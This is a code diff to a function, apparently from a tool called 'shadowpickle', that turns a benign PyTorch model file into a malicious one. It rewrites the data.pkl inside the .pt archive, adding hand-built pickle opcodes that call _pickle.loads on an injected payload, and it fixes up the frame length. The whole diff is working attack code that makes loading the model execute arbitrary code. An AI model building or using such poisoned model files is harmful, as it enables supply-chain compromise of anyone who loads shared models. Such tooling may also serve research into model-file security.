@@ -191,11 +191,28 @@ def inject_payload_into_pickle(benign_pkl_path: str, malicious_pkl_path: str, pa
 
 def inject_payload_into_torch(benign_pt_path: str, malicious_pt_path: str, payload_bytes: bytes) -> None:
     """Load a benign PyTorch model safely, insert the payload helper object, and save to malicious_pt_path."""
-    import torch
+    import zipfile
+    import struct
 
-    # Load safely using weights_only=True so no code runs during serialization
-    state_dict = torch.load(benign_pt_path, map_location="cpu", weights_only=True)
-    
-    state_dict["_shadowpickle_payload"] = _InjectHelper(payload_bytes)
-    
-    torch.save(state_dict, malicious_pt_path)
+    with zipfile.ZipFile(benign_pt_path, "r") as z_in:
+        with zipfile.ZipFile(malicious_pt_path, "w", compression=zipfile.ZIP_DEFLATED) as z_out:
+            for item in z_in.infolist():
+                data = z_in.read(item.filename)
+                if item.filename.endswith("data.pkl"):
+                    # Find the STOP opcode at the end (b'.') and inject the loads call
+                    if data.endswith(b"."):
+                        injection = (
+                            b"c_pickle\nloads\n"
+                            b"("
+                            b"B" + struct.pack("<I", len(payload_bytes)) + payload_bytes +
+                            b"t"
+                            b"R"
+                            b"0"
+                        )
+                        rebuilt = data[:-1] + injection + b"."
+                        # Fix FRAME sizes if protocol >= 4
+                        if len(rebuilt) > 11 and rebuilt[0] == 0x80 and rebuilt[2] == 0x95:
+                            body_len = len(rebuilt) - 11
+                            rebuilt = rebuilt[:3] + struct.pack("<Q", body_len) + rebuilt[11:]
+                        data = rebuilt
+                z_out.writestr(item.filename, data)
